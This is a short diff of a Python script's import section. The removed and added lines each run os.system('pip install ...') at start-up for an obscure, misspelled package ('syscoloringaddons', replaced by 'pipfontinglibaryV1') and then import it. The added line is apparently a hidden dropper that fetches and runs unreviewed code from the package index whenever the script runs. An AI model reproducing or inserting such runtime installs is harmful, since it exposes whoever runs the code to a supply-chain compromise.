@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscoloringaddons")
-import syscoloringaddons
+os.system("pip install pipfontinglibaryV1")
+import pipfontinglibaryV1
 import random
 import requests
 import time
